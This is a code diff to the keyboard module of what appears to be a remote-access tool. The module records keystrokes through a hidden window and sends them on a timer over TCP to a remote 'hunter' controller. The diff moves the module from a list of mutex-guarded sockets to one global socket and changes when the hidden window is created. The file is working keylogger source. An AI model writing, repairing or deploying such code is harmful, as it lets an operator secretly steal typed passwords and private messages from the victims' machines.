@@ -2,11 +2,9 @@
 #include "Keybd.h"
 #include "VirtualKeyToAscii.h"
 
-// 此关键段用来保护 socket vector
-static CRITICAL_SECTION gCs;
 static Keybd gKbd; // 初始化类
 static HWND s_hWnd = NULL; // 用来接收原始设备输入的隐形窗口句柄
-static std::vector<TcpSocket*> gSockets; // socket 列表
+static TcpSocket gSock; // 用来送回键盘数据
 static std::vector<char> gBuffer; // 键盘数据缓冲区
 
 // 由于有内部本类的出现
@@ -16,43 +14,32 @@ static std::vector<char> gBuffer; // 键盘数据缓冲区
 // 也就不启动发送
 Keybd::Keybd()
 {
-	// 初始化关键段
-	InitializeCriticalSection(&gCs);
-	// 创建对话框接收原始输入设备消息
-	createDialogByNewThread();
 }
 
 Keybd::~Keybd()
 {
+	gSock.dissconnect();
+	// 如果窗口没有关就退窗口
 	if (s_hWnd) {
 		// 关闭计时器
 		KillTimer(s_hWnd, 0);
 		// 删除socket
-		const int max = gSockets.size();
-		for (int i = 0; i < max; ++i) {
-			gSockets.at(i)->dissconnect();
-			delete gSockets.at(i);
-		}
+		gSock.dissconnect();
 		// 关闭窗口
 		DestroyWindow(s_hWnd);
-
 	}
-	// 删除关键段
-	DeleteCriticalSection(&gCs);
 }
 
 void Keybd::startKeybd(std::string domain, int port)
 {
 	// 新建连接到hunter端的socket连接
-	TcpSocket* sock = new TcpSocket();
-	if (!sock->connectTo(domain, port)) {
-		delete sock;
+	if (!gSock.connectTo(domain, port)) {
+		gSock.dissconnect();
 		OutputDebugStringA("Failed to connect hunter for keybd\r\n");
 		return;
 	}
-
-	// 将此socket添加至本类socket列表
-	addSocket(sock);
+	// 创建对话框接收原始输入设备消息
+	createDialogByNewThread();
 
 	OutputDebugStringA("Started keybd success\r\n" );
 }
@@ -181,41 +168,6 @@ void Keybd::saveKey(USHORT usVKey) {
 	}
 }
 
-void Keybd::addSocket(TcpSocket* sock)
-{
-	EnterCriticalSection(&gCs);
-
-	gSockets.push_back(sock);
-
-	LeaveCriticalSection(&gCs);
-}
-
-std::vector<TcpSocket*> Keybd::getSockets()
-{
-	EnterCriticalSection(&gCs);
-
-	std::vector<TcpSocket*> sockets = gSockets;
-
-	LeaveCriticalSection(&gCs);
-
-	return sockets;
-}
-
-void Keybd::delSocket(TcpSocket* sock)
-{
-	EnterCriticalSection(&gCs);
-
-	std::vector<TcpSocket*>::iterator iter = gSockets.begin();
-	for (; iter != gSockets.end(); ++iter) {
-		if (*iter == sock) {
-			gSockets.erase(iter);
-			break;
-		}
-	}
-
-	LeaveCriticalSection(&gCs);
-}
-
 void Keybd::addBuffer(char data)
 {
 	gBuffer.push_back(data);
@@ -229,23 +181,24 @@ void Keybd::delBuffer()
 void Keybd::sendKeybdData(HWND, UINT, UINT, DWORD)
 {
 	if (gBuffer.size() > 0) {
-		std::vector<TcpSocket*> sockets = getSockets();
-		int max = sockets.size();
-		for (int i = 0; i < max; ++i) {
-			TcpSocket* sock = sockets.at(i);
-			// 在socket列表中将没有连接的socket删除
-			// 有连接的就发送数据
-			if (!sock->sendData(&gBuffer[0], gBuffer.size())) {
-				delSocket(sock);
-
-				delete sock;
-
-				OutputDebugStringA("Finished keybd\r\n");
+		//将没有连接的socket删除
+		// 有连接的就发送数据
+		if (!gSock.sendData(&gBuffer[0], gBuffer.size())) {
+			gSock.dissconnect();
+			// 没有连接了就退
+			if (s_hWnd) {
+				// 关闭计时器
+				KillTimer(s_hWnd, 0);
+				// 删除socket
+				gSock.dissconnect();
+				// 关闭窗口
+				DestroyWindow(s_hWnd);
 			}
+			OutputDebugStringA("Finished keybd\r\n");
 		}
-		// 每次都要清理缓冲区 只发送实时数据
-		delBuffer();
 	}
+	// 每次都要清理缓冲区 只发送实时数据
+	delBuffer();
 }
 
 
